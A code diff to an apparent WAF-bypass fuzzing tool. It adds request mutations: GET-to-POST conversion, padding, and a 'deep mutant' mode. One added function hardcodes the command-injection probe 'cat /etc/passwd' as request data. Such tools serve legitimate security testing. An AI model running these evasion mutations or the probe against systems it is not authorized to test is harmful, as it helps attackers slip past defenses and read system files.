@@ -36,6 +36,30 @@ def mutant_methods_modify_content_type(headers, url, method, data, files):
     #         })        
     return mutant_payloads
 
+
+
+
+
+
+def mutant_methods_change_request_method(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_change_request_method")
+    logger.debug(TAG + "==>headers: " + str(headers))
+    if method == 'GET':
+        # 解析 URL 和查询参数
+        parsed_url = urllib.parse.urlparse(url)
+        get_params = urllib.parse.parse_qs(parsed_url.query)
+        # add     "Content-Type": "application/x-www-form-urlencoded" to headers
+        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+        # 构建新的 POST 请求
+        post_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+        post_url = post_url.replace('get', 'post')
+        post_data = {k: v[0] for k, v in get_params.items()}  # 将查询参数变成 POST 数据
+        return headers, post_url, 'POST', post_data, files,True
+    else:
+        return headers, url, method, data, files,False
+
+
+
 # 协议未覆盖绕过
 # 在 http 头里的 Content-Type 提交表单支持四种协议：
 # •application/x-www-form-urlencoded -编码模式
@@ -371,6 +395,9 @@ def mutant_methods_add_padding(headers, url, method, data, files):
     padding_data = 'x' * 1024  * 5  # 5 kB 的无用数据
     if isinstance(data, bytes) and isinstance(padding_data, str):
         padding_data = padding_data.encode()  # 将 padding_data 转换为字节串
+    if isinstance(data, dict):
+        from urllib.parse import urlencode
+        data = urlencode(data)
     if data:
         data += padding_data
     else:
@@ -604,6 +631,33 @@ def mutant_methods_sql_comment_obfuscation(headers, url, method, data, files):
         })
     
     return mutant_payloads
+
+def mutant_methods_convert_get_to_post(headers, url, method, data, files):
+    """ 将GET请求转换为POST请求 """
+    logger.info(TAG + "==>mutant_methods_convert_get_to_post")
+    logger.debug(TAG + "==>headers: " + str(headers))
+    mutant_payloads = []
+    if method == 'GET':
+        # 将GET请求转换为POST请求
+        mutated_method = 'POST'
+        # 提取GET请求的参数
+        query = urllib.parse.urlparse(url).query
+        url = url.split('?')[0]
+        url = url.replace('get', 'post')
+        data = {'cmd': 'cat /etc/passwd'}
+        # add htest parameters to headers
+        headers['content-type'] = 'application/x-www-form-urlencoded'
+        headers.pop('Content-Type', None)
+        # 将GET请求的参数添加到data中
+        # data = urllib.parse.urlencode(data)
+        mutant_payloads.append({
+            'headers': headers,
+            'url': url,
+            'method': mutated_method,
+            'data': data,
+            'files': files
+        })
+    return mutant_payloads
 '''
 ALL MUTANT METHODS:
 mutant_methods_modify_content_type
@@ -623,6 +677,7 @@ mutant_methods_add_harmless_command_for_get_request
 mutant_methods_chunked_transfer_encoding
 mutant_methods_multipart_form_data
 mutant_methods_sql_comment_obfuscation
+mutant_methods_convert_get_to_post
 
 '''
 # 为变异方法添加开关
@@ -644,6 +699,7 @@ mutant_methods_config = {
     "mutant_methods_chunked_transfer_encoding": (mutant_methods_chunked_transfer_encoding, True),
     "mutant_methods_multipart_form_data": (mutant_methods_multipart_form_data, True),
     "mutant_methods_sql_comment_obfuscation": (mutant_methods_sql_comment_obfuscation, False),
+    "mutant_methods_convert_get_to_post": (mutant_methods_convert_get_to_post, False),
 
 }
 
@@ -656,13 +712,15 @@ mutant_methods = [
 # mutant_methods = [mutant_methods_sql_comment_obfuscation]
 # mutant_methods = [mutant_methods_add_harmless_command_for_get_request]
 # mutant_methods = [mutant_methods_add_Content_Type_for_get_request]
+# mutant_methods = [mutant_methods_convert_get_to_post]
 # 上传载荷变异方法
 mutant_methods_dedicated_to_upload = []
 
-def prowler_begin_to_mutant_payloads(headers, url, method, data,files=None,memory=None):
+def prowler_begin_to_mutant_payloads(headers, url, method, data,files=None,memory=None,deep_mutant=False):
     logger.info(TAG + "==>begin to mutant payloads")
+    url_backup = copy.deepcopy(url)
     mutant_payloads = []
-    if os.path.exists("config/memory.json"):
+    if os.path.exists("config/memory.json") and not deep_mutant:
         with open("config/memory.json", "r") as f:
             try:
                 memories = json.load(f)
@@ -689,6 +747,13 @@ def prowler_begin_to_mutant_payloads(headers, url, method, data,files=None,memor
         #打印当前路径
         logger.info(os.getcwd())
         logger.info("memory.json not exists")
+        # exit()
+    if deep_mutant:
+        logger.info(TAG + "==>deep mutant")
+        headers,url,method,data,files,success = mutant_methods_change_request_method(headers,url,method,data,files)
+        if not success:
+            return []
+        # print(headers,url,method,data,files)
         # exit()
     for mutant_method in mutant_methods:
         # 对需要变异的参数进行深拷贝
@@ -720,5 +785,5 @@ def prowler_begin_to_mutant_payloads(headers, url, method, data,files=None,memor
             })
     # keep original url for result
     for payload in mutant_payloads:
-        payload['original_url'] = url
+        payload['original_url'] = url_backup
     return mutant_payloads
